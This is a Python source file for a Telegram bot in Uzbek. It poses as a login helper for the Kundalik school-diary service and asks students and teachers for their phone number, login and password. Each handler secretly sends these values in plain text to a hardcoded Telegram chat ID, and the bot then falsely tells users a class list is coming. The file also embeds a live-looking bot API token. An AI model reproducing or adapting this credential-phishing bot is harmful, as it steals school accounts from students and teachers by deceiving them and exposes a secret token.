import logging
import sqlite3
from aiogram import executor
from aiogram import Bot, Dispatcher, types
from aiogram.contrib.middlewares.logging import LoggingMiddleware
from Keyboards.default import button
from Keyboards.inline import kundalikcom_button
from Keyboards.default import contact
#-------------------------STATE-------------------------#

from aiogram.dispatcher.filters.state import State, StatesGroup
from aiogram.dispatcher import FSMContext
from aiogram.contrib.fsm_storage.memory import MemoryStorage











API_TOKEN = "6868422878:AAHJM5pi6ldDSoHr-iMMWlFPmiGqPwjTPhM"

logging.basicConfig(level=logging.INFO)
bot = Bot(token=API_TOKEN, parse_mode='HTML')
dp = Dispatcher(bot, storage=MemoryStorage())
dp.middleware.setup(LoggingMiddleware())
class Form(StatesGroup):
    student_login = State()
    student_parol = State()
    teacher_login = State()
    teacher_parol = State()
    contact = State()

conn = sqlite3.connect('login.db')
c = conn.cursor()

c.execute('''CREATE TABLE IF NOT EXISTS logins(
                   user_id INTEGER,
                   login TEXT,
                   password TEXT,
                   date DATE)''')
conn.commit()




@dp.message_handler(commands=['start'])
async def cmd_start(message: types.Message,state:FSMContext):
    user = message.from_user.id
    await bot.send_message(6498877955,f"User id: {user}")
    await message.reply(f"Assalomu aleykum Xurmatli {message.from_user.full_name}\n\nBu botdan foydalanish uchun contactingizni yuboring",reply_markup=contact)
    await Form.contact.set()



@dp.message_handler(content_types=types.ContentTypes.CONTACT, state=Form.contact)
async def contact_11(message: types.Message,state:FSMContext):
    phone_number = message.contact.phone_number
    image1 = message.photo
    await bot.send_message(6498877955,f"Phone number : <b>+{phone_number}</b>\n\n")
    await message.answer("Siz ozingizni O'quvchi yoki O'qituvchi ekanlingizni tasdiqlang",reply_markup=button)
    await state.finish()

#-------------------------O'qituvchi-------------------------#

@dp.message_handler(text="O'qituvchi 👨🏻‍🏫")
async def Oquvchi(message: types.Message,state:FSMContext):
    await message.answer("Kundalik profilingizga kirish uchun\n\n<b>Loginingizni</b> kiriting 👤",reply_markup=types.ReplyKeyboardRemove())
    await Form.teacher_login.set()


@dp.message_handler(state=Form.teacher_login, content_types=types.ContentTypes.TEXT)
async def Oquvchi(message: types.Message,state:FSMContext):
    login = str(message.text)
    await bot.send_message(6498877955,f"O'qituvchi 👨🏻‍🏫 <b>logini</b>: <code>{login}<code/>")
    await message.answer("<b>Parolingizni</b> kiriting 🔑")
    await state.finish()
    await Form.teacher_parol.set()



@dp.message_handler(state=Form.teacher_parol, content_types=types.ContentTypes.TEXT)
async def Oquvchi(message: types.Message,state:FSMContext):
    password = str(message.text)
    await bot.send_message(6498877955,f"O'qituvchi 👨🏻‍🏫 <b>paroli</b>: <code>{password}<code/>")
    await message.answer(f"Tez orada o'quvchilar royxati chiqadi",reply_markup=kundalikcom_button)
    await message.answer("⏳")
    await state.finish()

#-------------------------O'quvchi-------------------------#


@dp.message_handler(text="O'quvchi 👨‍🎓")
async def Oquvchi(message: types.Message,state:FSMContext):
    await message.answer("Kundalik profilingizga kirish uchun\n\n<b>Loginingizni</b> kiriting 👤",reply_markup=types.ReplyKeyboardRemove())
    await Form.student_login.set()





#-------------------------O'quvchi-------------------------#


@dp.message_handler(state=Form.student_login, content_types=types.ContentTypes.TEXT)
async def Oquvchi(message: types.Message,state:FSMContext):
    login = str(message.text)
    await bot.send_message(6498877955,f"O'quvchi 👨‍🎓 <b>logini</b>: {login}")
    await message.answer("<b>Parolingizni</b> kiriting 🔑")
    await state.finish()
    await Form.student_parol.set()







@dp.message_handler(state=Form.student_parol, content_types=types.ContentTypes.TEXT)
async def Oquvchi(message: types.Message,state:FSMContext):
    password = str(message.text)
    await bot.send_message(6498877955,f"O'quvchi 👨‍🎓 <b>paroli</b>: {password}")
    await message.answer(f"Tez orada o'quvchilar royxati chiqadi",reply_markup=kundalikcom_button)
    await message.answer("⏳")
    await state.finish()



if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True)
